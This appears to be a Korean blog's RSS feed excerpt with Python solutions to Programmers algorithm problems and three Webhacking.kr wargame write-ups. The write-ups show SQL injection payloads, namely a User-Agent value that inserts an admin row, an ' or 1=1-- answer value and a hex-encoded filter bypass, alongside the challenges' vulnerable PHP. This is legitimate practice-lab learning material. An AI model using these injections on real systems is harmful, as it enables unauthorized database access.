      <content:encoded><![CDATA[<h1 id="시저-암호"><a href="#시저-암호" class="headerlink" title="시저 암호"></a><a href="https://programmers.co.kr/learn/courses/30/lessons/12926">시저 암호</a></h1><h2 id="문제-설명"><a href="#문제-설명" class="headerlink" title="문제 설명"></a>문제 설명</h2><p>어떤 문장의 각 알파벳을 일정한 거리만큼 밀어서 다른 알파벳으로 바꾸는 암호화 방식을 시저 암호라고 합니다. 예를 들어 “AB”는 1만큼 밀면 “BC”가 되고, 3만큼 밀면 “DE”가 됩니다. “z”는 1만큼 밀면 “a”가 됩니다. 문자열 s와 거리 n을 입력받아 s를 n만큼 민 암호문을 만드는 함수, solution을 완성해 보세요.</p><h2 id="제한-조건"><a href="#제한-조건" class="headerlink" title="제한 조건"></a>제한 조건</h2><ul><li>공백은 아무리 밀어도 공백입니다.</li><li>s는 알파벳 소문자, 대문자, 공백으로만 이루어져 있습니다.</li><li>s의 길이는 8000이하입니다.</li><li>n은 1 이상, 25이하인 자연수입니다.</li></ul><h3 id="문제-풀이"><a href="#문제-풀이" class="headerlink" title="문제 풀이"></a>문제 풀이</h3><h4 id="방법1"><a href="#방법1" class="headerlink" title="방법1"></a>방법1</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">indexSize</span>(<span class="params">idx:<span class="built_in">int</span></span>):</span></span><br><span class="line">        <span class="keyword">return</span> idx - <span class="number">26</span> <span class="keyword">if</span> idx &gt;= <span class="number">26</span> <span class="keyword">else</span> idx</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution</span>(<span class="params">s:<span class="built_in">str</span>, n:<span class="built_in">int</span></span>):</span></span><br><span class="line">    lowerList = <span class="built_in">list</span>(string.ascii_lowercase)</span><br><span class="line">    s = <span class="built_in">list</span>(s)</span><br><span class="line">    </span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> i.isupper():</span><br><span class="line">            idx = indexSize(lowerList.index(i.lower()) + n)</span><br><span class="line">            result += lowerList[idx].upper()</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">elif</span> i.islower():</span><br><span class="line">            idx = indexSize(lowerList.index(i) + n)</span><br><span class="line">            result += lowerList[idx]</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result += i</span><br><span class="line">            </span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p>이 방법은 소문자 알파벳의 리스트를 생성하여, 인덱스를 n만큼 증가시켜서 출력하는 풀이이다.</p><h4 id="방법2"><a href="#방법2" class="headerlink" title="방법2"></a>방법2</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution</span>(<span class="params">s:<span class="built_in">str</span>, n:<span class="built_in">int</span></span>):</span></span><br><span class="line">    s = <span class="built_in">list</span>(s)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">        <span class="keyword">if</span> s[i].isupper():</span><br><span class="line">            s[i] = <span class="built_in">chr</span>((<span class="built_in">ord</span>(s[i]) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) + n) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>))</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">elif</span> s[i].islower():</span><br><span class="line">            s[i] = <span class="built_in">chr</span>((<span class="built_in">ord</span>(s[i]) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) + n) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(s)</span><br></pre></td></tr></table></figure><p>아스키코드를 이용한 방법이다.<br><br>방법1에선 26을 넘어가는 인덱스는 조건문을 이용하여, 인덱스 - 26로 하여 크기를 조정해줬는데 방법2에선 <code>%26</code>를 이용하여 조정하였다.</p>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/">알고리즘</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/">프로그래머스</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/Level-1/">Level 1</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/Programmers/">Programmers</category>
      
      <category domain="https://lrtk-coder.github.io/tags/Programmers-Level-1/">Programmers Level 1</category>
      
      <category domain="https://lrtk-coder.github.io/tags/%EA%B5%AC%ED%98%84/">구현</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/05/28/Programmers-Level-1-%EC%8B%9C%EC%A0%80-%EC%95%94%ED%98%B8/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Programmers Level 1 - 이상한 문자 만들기</title>
      <link>https://lrtk-coder.github.io/2021/05/28/Programmers-Level-1-%EC%9D%B4%EC%83%81%ED%95%9C-%EB%AC%B8%EC%9E%90-%EB%A7%8C%EB%93%A4%EA%B8%B0/</link>
      <guid>https://lrtk-coder.github.io/2021/05/28/Programmers-Level-1-%EC%9D%B4%EC%83%81%ED%95%9C-%EB%AC%B8%EC%9E%90-%EB%A7%8C%EB%93%A4%EA%B8%B0/</guid>
      <pubDate>Fri, 28 May 2021 01:26:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;이상한-문자-만들기&quot;&gt;&lt;a href=&quot;#이상한-문자-만들기&quot; class=&quot;headerlink&quot; title=&quot;이상한 문자 만들기&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://programmers.co.kr/learn/courses/30/less</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="이상한-문자-만들기"><a href="#이상한-문자-만들기" class="headerlink" title="이상한 문자 만들기"></a><a href="https://programmers.co.kr/learn/courses/30/lessons/12930">이상한 문자 만들기</a></h1><h2 id="문제-설명"><a href="#문제-설명" class="headerlink" title="문제 설명"></a>문제 설명</h2><p>문자열 s는 한 개 이상의 단어로 구성되어 있습니다. 각 단어는 하나 이상의 공백문자로 구분되어 있습니다. 각 단어의 짝수번째 알파벳은 대문자로, 홀수번째 알파벳은 소문자로 바꾼 문자열을 리턴하는 함수, solution을 완성하세요.</p><h2 id="제한-사항"><a href="#제한-사항" class="headerlink" title="제한 사항"></a>제한 사항</h2><ul><li>문자열 전체의 짝/홀수 인덱스가 아니라, 단어(공백을 기준)별로 짝/홀수 인덱스를 판단해야합니다.</li><li>첫 번째 글자는 0번째 인덱스로 보아 짝수번째 알파벳으로 처리해야 합니다.</li></ul><h3 id="문제-풀이"><a href="#문제-풀이" class="headerlink" title="문제 풀이"></a>문제 풀이</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution</span>(<span class="params">s:<span class="built_in">str</span></span>):</span></span><br><span class="line">    s = s.lower().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        i = <span class="built_in">list</span>(i)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(i), <span class="number">2</span>):</span><br><span class="line">            i[j] = i[j].upper()</span><br><span class="line"></span><br><span class="line">        result.append(<span class="string">&#x27;&#x27;</span>.join(i))</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27; &#x27;</span>.join(result)</span><br></pre></td></tr></table></figure><p>나는 문자열을 소문자로 변경 후 띄어쓰기 기준으로 나누어 리스트로 만들었다.<br><br>이때 중요한 것은 나눠진 부분은 띄어쓰기로 구분하였다.<br><br>E.g.) <code>aa aa</code> -&gt; <code>[&#39;aa&#39;, &#39; &#39;, &#39;aa&#39;]</code></p><p>그리고 0부터 2씩 증가시켜서 알파벳을 대문자로 변경하였다.</p>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/">알고리즘</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/">프로그래머스</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/Level-1/">Level 1</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/Programmers/">Programmers</category>
      
      <category domain="https://lrtk-coder.github.io/tags/Programmers-Level-1/">Programmers Level 1</category>
      
      <category domain="https://lrtk-coder.github.io/tags/%EA%B5%AC%ED%98%84/">구현</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/05/28/Programmers-Level-1-%EC%9D%B4%EC%83%81%ED%95%9C-%EB%AC%B8%EC%9E%90-%EB%A7%8C%EB%93%A4%EA%B8%B0/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Programmers Level 1 - 정수 내림차순으로 배치하기</title>
      <link>https://lrtk-coder.github.io/2021/05/28/Programmers-Level-1-%EC%A0%95%EC%88%98-%EB%82%B4%EB%A6%BC%EC%B0%A8%EC%88%9C%EC%9C%BC%EB%A1%9C-%EB%B0%B0%EC%B9%98%ED%95%98%EA%B8%B0/</link>
      <guid>https://lrtk-coder.github.io/2021/05/28/Programmers-Level-1-%EC%A0%95%EC%88%98-%EB%82%B4%EB%A6%BC%EC%B0%A8%EC%88%9C%EC%9C%BC%EB%A1%9C-%EB%B0%B0%EC%B9%98%ED%95%98%EA%B8%B0/</guid>
      <pubDate>Fri, 28 May 2021 00:45:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;정수-내림차순으로-배치하기&quot;&gt;&lt;a href=&quot;#정수-내림차순으로-배치하기&quot; class=&quot;headerlink&quot; title=&quot;정수 내림차순으로 배치하기&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://programmers.co.kr/learn/cou</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="정수-내림차순으로-배치하기"><a href="#정수-내림차순으로-배치하기" class="headerlink" title="정수 내림차순으로 배치하기"></a><a href="https://programmers.co.kr/learn/courses/30/lessons/12933">정수 내림차순으로 배치하기</a></h1><h2 id="문제-설명"><a href="#문제-설명" class="headerlink" title="문제 설명"></a>문제 설명</h2><p>함수 solution은 정수 n을 매개변수로 입력받습니다. n의 각 자릿수를 큰것부터 작은 순으로 정렬한 새로운 정수를 리턴해주세요. 예를들어 n이 118372면 873211을 리턴하면 됩니다.</p><h2 id="제한-조건"><a href="#제한-조건" class="headerlink" title="제한 조건"></a>제한 조건</h2><ul><li>n은 1이상 8000000000 이하인 자연수입니다.</li></ul><h3 id="문제-풀이"><a href="#문제-풀이" class="headerlink" title="문제 풀이"></a>문제 풀이</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution</span>(<span class="params">n:<span class="built_in">int</span></span>):</span></span><br><span class="line">    n = <span class="built_in">sorted</span>(<span class="built_in">str</span>(n), reverse=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join(n))</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/">알고리즘</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/">프로그래머스</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/Level-1/">Level 1</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/Programmers/">Programmers</category>
      
      <category domain="https://lrtk-coder.github.io/tags/Programmers-Level-1/">Programmers Level 1</category>
      
      <category domain="https://lrtk-coder.github.io/tags/%EA%B5%AC%ED%98%84/">구현</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/05/28/Programmers-Level-1-%EC%A0%95%EC%88%98-%EB%82%B4%EB%A6%BC%EC%B0%A8%EC%88%9C%EC%9C%BC%EB%A1%9C-%EB%B0%B0%EC%B9%98%ED%95%98%EA%B8%B0/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Webhacking.kr Old - 8 Write Up</title>
      <link>https://lrtk-coder.github.io/2021/05/28/Webhacking-kr-Old-8-Write-Up/</link>
      <guid>https://lrtk-coder.github.io/2021/05/28/Webhacking-kr-Old-8-Write-Up/</guid>
      <pubDate>Fri, 28 May 2021 00:32:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;Webhacking-kr-Write-Up&quot;&gt;&lt;a href=&quot;#Webhacking-kr-Write-Up&quot; class=&quot;headerlink&quot; title=&quot;Webhacking.kr Write Up&quot;&gt;&lt;/a&gt;Webhacking.kr Write </description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="Webhacking-kr-Write-Up"><a href="#Webhacking-kr-Write-Up" class="headerlink" title="Webhacking.kr Write Up"></a>Webhacking.kr Write Up</h1><h2 id="Old-8"><a href="#Old-8" class="headerlink" title="Old - 8"></a>Old - 8</h2><p><img src="/images/pasted-494.png"><br>특별한 반응이 없어서 코드를 확인하였다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$agent=trim(getenv(<span class="string">&quot;HTTP_USER_AGENT&quot;</span>));</span><br><span class="line">$ip=$_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/from/i&quot;</span>,$agent))&#123;</span><br><span class="line">  <span class="keyword">echo</span>(<span class="string">&quot;&lt;br&gt;Access Denied!&lt;br&gt;&lt;br&gt;&quot;</span>);</span><br><span class="line">  <span class="keyword">echo</span>(htmlspecialchars($agent));</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>접속한 브라우저와 공인 ip를 각각 agent, ip 변수에 넣어줬다.<br><br>Agent 변수는 preg_match 함수로, <code>from</code>문자열이 있는지 검사하였다.<br><br>만약 있다면, Access Denied! 문구와 agent에 있는 특수문자가 HTML 엔티티로 변환된 문자열을 페이지에 출력하고, 종료한다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$db = dbconnect();</span><br><span class="line">$count_ck = mysqli_fetch_array(mysqli_query($db,<span class="string">&quot;select count(id) from chall8&quot;</span>));</span><br><span class="line"><span class="keyword">if</span>($count_ck[<span class="number">0</span>] &gt;= <span class="number">70</span>)&#123; mysqli_query($db,<span class="string">&quot;delete from chall8&quot;</span>); &#125;</span><br></pre></td></tr></table></figure><p>Chall8 테이블에 ID 컬럼의 총 갯수를 count_ck 변수에 넣어줬다.<br><br>만약 count_ck 변수의 값이 70개 이상이라면, chall8 테이블은 삭제된다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$result = mysqli_query($db,<span class="string">&quot;select id from chall8 where agent=&#x27;&quot;</span>.addslashes($_SERVER[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>]).<span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">$ck = mysqli_fetch_array($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($ck)&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;hi &lt;b&gt;&quot;</span>.htmlentities($ck[<span class="number">0</span>]).<span class="string">&quot;&lt;/b&gt;&lt;p&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span>($ck[<span class="number">0</span>]==<span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">    mysqli_query($db,<span class="string">&quot;delete from chall8&quot;</span>);</span><br><span class="line">    solve(<span class="number">8</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$ck)&#123;</span><br><span class="line">  $q=mysqli_query($db,<span class="string">&quot;insert into chall8(agent,ip,id) values(&#x27;<span class="subst">&#123;$agent&#125;</span>&#x27;,&#x27;<span class="subst">&#123;$ip&#125;</span>&#x27;,&#x27;guest&#x27;)&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;query error&quot;</span>);</span><br><span class="line">  <span class="keyword">echo</span>(<span class="string">&quot;&lt;br&gt;&lt;br&gt;done!  (<span class="subst">&#123;$count_ck[0]&#125;</span>/70)&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>select id from chall8 where agent=접속한 브라우저</code>로 나온 결과가 없다면, 테이블에 agent, ip 변수를 삽입한다.<br><br>만약 결과가 있고, 그 결과가 admin이면 Flag를 획득할 수 있다.</p><p>나는 프록시를 이용하여 agent 정보를 수정하여 SQLi를 진행할 것이다.<br><br>일단 첫번째 목표를 insert 쿼리에 SQLi를 삽입하여 admin을 생성하여, 요청할 것이다.</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">User-Agent</span>: lrtk&#x27;, &#x27;0&#x27;, &#x27;admin&#x27;)#</span><br></pre></td></tr></table></figure><p>위와 같은 SQLi를 삽입하였다.<br><br>삽입을 한 쿼리를 보면, <code>insert into chall8(agent,ip,id) values(&#39;lrtk, &#39;0&#39;, &#39;admin&#39;)#&#39;,&#39;&#123;$ip&#125;&#39;,&#39;guest&#39;)</code>으로 된다.<br></p><p><img src="/images/pasted-495.png"><br><code>--</code> 대신 <code>#</code>를 사용한 이유는 <code>trim(getenv(&quot;HTTP_USER_AGENT&quot;))</code> 때문이다.<br><br><code>--</code>를 사용하여, 뒤의 쿼리가 주석처리가 되기 위해선 <code>--</code>뒤에 공백이 존재해야 한다. 하지만 trim 함수로 공백이 삭제가 되기 때문에 <code>--</code>은 주석처리가 되지 않는다.<br><br><code>#</code>의 경우, 뒤에 공백이 없어도 주석처리가 되기 때문에 <code>#</code>를 이용하여 주석처리를 한 것이다.</p><p><img src="/images/pasted-496.png"><br>테이블에 데이터를 삽입하고, 다시 Agent를 lrtk로 수정하여 보내면, Flag를 획득할 수 있다.</p>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/Security/">Security</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/">Web</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/Webhacking-kr/">Webhacking.kr</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/Webhacking-kr/">Webhacking,kr</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/05/28/Webhacking-kr-Old-8-Write-Up/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Webhacking.kr Old - 3 Write Up</title>
      <link>https://lrtk-coder.github.io/2021/05/27/Webhacking-kr-Old-3-Write-Up/</link>
      <guid>https://lrtk-coder.github.io/2021/05/27/Webhacking-kr-Old-3-Write-Up/</guid>
      <pubDate>Thu, 27 May 2021 20:15:12 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;Webhacking-kr-Write-Up&quot;&gt;&lt;a href=&quot;#Webhacking-kr-Write-Up&quot; class=&quot;headerlink&quot; title=&quot;Webhacking.kr Write Up&quot;&gt;&lt;/a&gt;Webhacking.kr Write </description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="Webhacking-kr-Write-Up"><a href="#Webhacking-kr-Write-Up" class="headerlink" title="Webhacking.kr Write Up"></a>Webhacking.kr Write Up</h1><h2 id="Old-3"><a href="#Old-3" class="headerlink" title="Old - 3"></a>Old - 3</h2><p><img src="/images/pasted-481.png"><br>이상한 페이지가 나왔다.</p><p><img src="/images/pasted-482.png"><br>작은 박스를 클릭하니, 색이 검정색으로 변경하고 값이 1로 변경이 되었다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">go</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> answer=<span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="function"><span class="title">for</span>(<span class="params">i=<span class="number">1</span>;i&lt;=<span class="number">25</span>;i++</span>)</span> &#123; answer=answer+<span class="built_in">eval</span>(<span class="string">&quot;kk._&quot;</span>+i+<span class="string">&quot;.value&quot;</span>); &#125;</span><br><span class="line">  kk._answer.value=answer;</span><br><span class="line">  kk.submit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Solved 버튼을 클릭 시 서버에 어떤한 값이 보내지는지 확인을 해보니, Input들의 값들을 한 문자열로 만든 후 서버로 보내졌다.<br><br>일단 저 퍼즐을 어떻게 푸는 지 몰라서 느낌대로 클릭 후 서버로 보냈는데, No!!라는 문구를 출력 후 다시 퍼즐 페이지로 리다이렉트되었다.</p><p><img src="/images/pasted-483.png"><br>퍼즐 위에 Nonogram이라는 글자가 있는데, 퍼즐의 이름이 Nonogram인 듯하여 인터넷에 검색하였다.<br><br>row와 column에 있는 숫자들을 이용하여 그림을 만드는 것이였다.</p><p><img src="/images/pasted-484.png"></p><blockquote><p><a href="https://itfix.tistory.com/1036">네모네모 로직,  노노그램 하는 방법</a><br>위 사이트를 참고하여, 노노그램을 풀이하였다.</p></blockquote><p><img src="/images/pasted-485.png"><br>서버로 보내지는 값을 보니, 위에서 말했던 것처럼 Input들의 값들이 한 문자열로 합쳐져 있다.</p><p><img src="/images/pasted-486.png"><br>값을 보내니, 클리어하였다고 이름을 등록하는 사이트로 이동하였다.</p><p><img src="/images/pasted-487.png"><br>등록하니, 이러한 로그가 페이지에 출력되었다.</p><p><img src="/images/pasted-488.png"><br>뒤로가기를 하여, 다른 이름으로 등록하니 이름만 다르고 같은 로그가 찍혔다.</p><p><img src="/images/pasted-489.png"><br>다시 뒤로가기를 하여, 이름 등록하는 페이지의 코드를 살펴봤다.<br><br>그 결과 숨겨진 Input을 볼 수 있었다.</p><p>나는 공격 백터를 이름 Input과 answer Input으로 잡고 일단 SQLi 테스트를 하였다.</p><p><img src="/images/pasted-490.png"><br>이름에선 Error가 발생되지 않았다.</p><p><img src="/images/pasted-491.png"><br>answer에선 에러가 발생하여, answer에서 SQLi를 진행하였다.</p><p><img src="/images/pasted-492.png"><br><code>&quot;1010100000011100101011111&#39; or 1=1-- &quot;</code>로 값을 변경하여 어떻게 반응할 지 확인을 하였는데, Flag가 나왔다…</p><p><img src="/images/pasted-493.png"><br>True가 되면서 모든 값들이 나와 Flag를 주는 것으로 판단된다.</p>]]></content:encoded>
      
      
      
      
      <comments>https://lrtk-coder.github.io/2021/05/27/Webhacking-kr-Old-3-Write-Up/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Webhacking.kr Old - 49 Write Up</title>
      <link>https://lrtk-coder.github.io/2021/05/27/Webhacking-kr-Old-49-Write-Up/</link>
      <guid>https://lrtk-coder.github.io/2021/05/27/Webhacking-kr-Old-49-Write-Up/</guid>
      <pubDate>Thu, 27 May 2021 00:34:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;Webhacking-kr-Write-Up&quot;&gt;&lt;a href=&quot;#Webhacking-kr-Write-Up&quot; class=&quot;headerlink&quot; title=&quot;Webhacking.kr Write Up&quot;&gt;&lt;/a&gt;Webhacking.kr Write </description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="Webhacking-kr-Write-Up"><a href="#Webhacking-kr-Write-Up" class="headerlink" title="Webhacking.kr Write Up"></a>Webhacking.kr Write Up</h1><h2 id="Old-49"><a href="#Old-49" class="headerlink" title="Old - 49"></a>Old - 49</h2><p><img src="/images/pasted-479.png"><br>46번 문제와 똑같은 페이지가 나왔다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">if</span>($_GET[<span class="string">&#x27;lv&#x27;</span>])&#123;</span><br><span class="line">    $db = dbconnect();</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/select|or|and|\(|\)|limit|,|\/|order|cash| |\t|\&#x27;|\&quot;/i&quot;</span>,$_GET[<span class="string">&#x27;lv&#x27;</span>])) <span class="keyword">exit</span>(<span class="string">&quot;no hack&quot;</span>);</span><br><span class="line">    $result = mysqli_fetch_array(mysqli_query($db,<span class="string">&quot;select id from chall49 where lv=<span class="subst">&#123;$_GET[&#x27;lv&#x27;]&#125;</span>&quot;</span>));</span><br><span class="line">    <span class="keyword">echo</span> $result[<span class="number">0</span>] ;</span><br><span class="line">    <span class="keyword">if</span>($result[<span class="number">0</span>]==<span class="string">&quot;admin&quot;</span>) solve(<span class="number">49</span>);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>코드를 보니, 입력 검증 <code>select, or, and, (, ), limit, ,, /, order, cash</code>가 있었다.<br><br>이 때문에 <code>(, ,, )</code>를 사용하는 46번 답은 검증에 걸린다.</p><p><img src="/images/pasted-480.png"><br>그래서 이번 검증에는 Hex가 없어서 admin을 hex로 인코딩하여 요청하니, Flag를 얻을 수 있었다.</p>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/Security/">Security</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/">Web</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/Webhacking-kr/">Webhacking.kr</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/Webhacking-kr/">Webhacking.kr</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/05/27/Webhacking-kr-Old-49-Write-Up/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
